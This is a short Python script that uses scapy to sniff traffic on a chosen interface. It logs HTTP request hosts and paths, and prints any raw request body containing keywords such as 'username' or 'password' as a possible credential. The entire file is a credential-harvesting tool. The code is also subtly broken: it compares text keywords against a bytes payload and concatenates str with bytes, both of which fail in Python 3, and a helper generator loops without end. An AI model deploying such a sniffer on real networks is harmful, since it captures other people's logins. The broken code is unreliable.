import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def expand(x) :
    yield x 
    while x.payload :
        x = x.payload

def process_packet(packet):
    # print(f'[+] Got Packet {type(packet)} {packet.haslayer(http.HTTP)} {packet.haslayer(http.HTTPRequest)} {packet.haslayer(http.HTTPResponse)}')
    # print(bytes(packet).decode(errors="backslashreplace"))
    # data = packet.show()
    # print(packet.type)
    # packet.show()
    # print(str(packet.sprintf))
    # for i in expand(packet) :
    #     print(f" -> {type(i)}")
    
    '''
    if packet.haslayer(scapy.Raw) :
        load = packet[scapy.Raw].load
        print(f"[+] Raw Data {load}")
    '''

    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break

iface = get_interface()
print(f"[+] Got {iface}")
sniff(iface)
